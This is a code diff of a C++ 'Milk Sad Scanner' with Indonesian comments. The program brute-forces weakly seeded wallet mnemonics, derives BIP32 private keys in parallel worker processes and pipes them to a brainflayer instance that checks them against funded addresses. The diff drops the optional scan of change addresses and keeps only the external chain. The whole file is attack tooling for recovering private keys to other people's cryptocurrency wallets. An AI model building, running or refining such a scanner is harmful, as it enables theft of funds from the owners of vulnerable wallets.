@@ -1,15 +1,11 @@
 /**
  * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL) with Single Brainflayer Instance
- * 
- * Upgrade:
+ * * Upgrade:
  * - Hanya satu proses brainflayer, semua worker menulis ke pipe.
  * - Mengurangi penggunaan memori (bloom filter hanya di‑load sekali).
  * - Output brainflayer digabung dalam satu file log.
  * - Progress reporting tetap via file per worker.
- * 
- * Upgrade tambahan:
- * - Pengguna dapat memilih untuk tidak menghasilkan alamat change (chain internal),
- *   sehingga hanya chain eksternal (0) yang diproses.
+ * - Chain kembalian/internal (1) dinonaktifkan, hanya scan eksternal (0).
  */
 
 #define _DEFAULT_SOURCE
@@ -237,10 +233,9 @@ std::string to_hex(const std::vector<uint8_t>& data){
 }
 
 // ================= WORKER =================
-// UPGRADE: tambah parameter bool include_change
 void worker_process(int id, uint64_t start, uint64_t end, int step,
                     const std::vector<std::string>& wordlist, int num_derivations,
-                    int pipe_fd, bool include_change) {
+                    int pipe_fd) {
 
     CryptoContext cc;
 
@@ -276,25 +271,24 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
         auto kAcc = CKDpriv_fast(kCoin, 0 | H, cc);
         if (!kAcc.valid) continue;
 
-        // UPGRADE: loop chain hanya jika include_change=true, chain=1 dijalankan, jika tidak hanya chain=0
-        for (uint32_t chain = 0; chain <= (include_change ? 1 : 0); ++chain) {
+        // Hanya menggunakan chain eksternal (0). Chain kembalian/internal (1) dinonaktifkan.
+        uint32_t chain = 0;
 
-            auto kChange = CKDpriv_fast(kAcc, chain, cc);
-            if (!kChange.valid) continue;
+        auto kChange = CKDpriv_fast(kAcc, chain, cc);
+        if (!kChange.valid) continue;
 
-            int derived = 0;
-            uint32_t idx = 0;
+        int derived = 0;
+        uint32_t idx = 0;
 
-            while (derived < num_derivations) {
-                auto child = CKDpriv_fast(kChange, idx++, cc);
-                if (!child.valid) continue;
-                std::string hex = to_hex(child.key);
-                if (dprintf(pipe_fd, "%s\n", hex.c_str()) < 0) {
-                    // Pipe error
-                    goto finish;  // keluar dari semua loop
-                }
-                derived++;
+        while (derived < num_derivations) {
+            auto child = CKDpriv_fast(kChange, idx++, cc);
+            if (!child.valid) continue;
+            std::string hex = to_hex(child.key);
+            if (dprintf(pipe_fd, "%s\n", hex.c_str()) < 0) {
+                // Pipe error
+                goto finish;  // keluar dari semua loop
             }
+            derived++;
         }
 
         // Update progress counter
@@ -345,12 +339,6 @@ int main() {
     int threads;
     std::cout << "Threads: "; std::cin >> threads;
 
-    // UPGRADE: tanyakan apakah ingin menyertakan alamat change
-    char inc;
-    std::cout << "Include change addresses? (y/n): ";
-    std::cin >> inc;
-    bool include_change = (inc == 'y' || inc == 'Y');
-
     // Buat pipe untuk komunikasi worker -> brainflayer
     int pipefd[2];
     if (pipe(pipefd) == -1) {
@@ -398,8 +386,7 @@ int main() {
         pid_t pid = fork();
         if (pid == 0) {
             // Worker process
-            // UPGRADE: berikan parameter include_change
-            worker_process(i, start + i, end, threads, wordlist, 5, pipe_write_fd, include_change);
+            worker_process(i, start + i, end, threads, wordlist, 5, pipe_write_fd);
             exit(0);
         } else if (pid > 0) {
             g_child_pids[i] = pid;
